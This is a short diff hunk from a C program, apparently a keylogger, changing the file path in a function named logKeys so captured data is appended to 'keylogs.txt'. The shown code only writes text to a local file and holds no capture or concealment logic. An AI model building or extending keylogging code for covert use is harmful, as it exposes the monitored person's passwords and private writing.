@@ -34,7 +34,7 @@ int main()
 void logKeys(char *data)
 {
     FILE *fptr;
-    fptr = fopen("H:\\Desktop\\My Documents\\notes\\C\\logs.txt", "a");
+    fptr = fopen("H:\\Desktop\\My Documents\\notes\\C\\keylogs.txt", "a");
     fprintf(fptr, "%s", data);
     fclose(fptr);
 }
